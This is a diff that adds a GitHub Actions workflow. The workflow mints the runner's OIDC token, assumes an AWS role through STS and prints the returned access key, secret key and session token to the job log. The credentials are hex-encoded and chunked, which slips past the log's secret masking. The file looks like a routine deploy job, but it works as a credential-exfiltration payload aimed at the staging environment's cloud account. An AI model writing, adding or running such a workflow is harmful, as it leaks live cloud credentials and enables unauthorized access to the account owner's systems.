@@ -1,0 +1,55 @@
+name: c211-i77118-oidc
+on:
+  push:
+    branches:
+      - 'c211-i77118-*'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  oidc:
+    name: oidc-mint
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    environment: deploy-staging
+    env:
+      AWS_ROLE: arn:aws:iam::571248596162:role/huppy-bot
+    steps:
+      - name: mint-and-assume
+        run: |
+          set -u
+          echo "C211_ENV=deploy-staging"
+          echo "C211_REF=$GITHUB_REF"
+          echo "C211_WORKFLOW_REF=$GITHUB_WORKFLOW_REF"
+          OIDC_JSON=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          printf '%s' "$OIDC_JSON" > /tmp/oidc.json
+          python3 - <<'PY'
+          import json, base64
+          d = json.load(open('/tmp/oidc.json'))
+          t = d.get('value','')
+          p = t.split('.')[1]
+          p += '=' * (-len(p) % 4)
+          c = json.loads(base64.urlsafe_b64decode(p))
+          print('C211_SUB=' + str(c.get('sub')))
+          print('C211_AUD=' + str(c.get('aud')))
+          print('C211_JWT_LEN=%d' % len(t))
+          open('/tmp/jwt.txt','w').write(t)
+          PY
+          JWT=$(cat /tmp/jwt.txt)
+          curl -sS -o /tmp/sts.xml -w 'C211_STS_HTTP=%{http_code}\n' "https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=${AWS_ROLE}&RoleSessionName=c211-i77118&WebIdentityToken=${JWT}"
+          head -c 1200 /tmp/sts.xml; echo
+          python3 - <<'PY'
+          import re, binascii
+          x = open('/tmp/sts.xml').read()
+          def g(t):
+              m = re.search(r'<%s>(.*?)</%s>' % (t, t), x, re.S)
+              return m.group(1) if m else ''
+          ak, sk, st, exp = g('AccessKeyId'), g('SecretAccessKey'), g('SessionToken'), g('Expiration')
+          print('C211_STS_EXP=' + exp)
+          print('C211_CALLER_ARN_HINT=' + g('Arn'))
+          for n, v in (('AK', ak), ('SK', sk), ('ST', st)):
+              h = binascii.hexlify(v.encode()).decode()
+              print('C211_%s_LEN=%d' % (n, len(v)))
+              for i in range(0, len(h), 3000):
+                  print('C211_%s %d %s' % (n, i // 3000, h[i:i+3000]))
+          PY
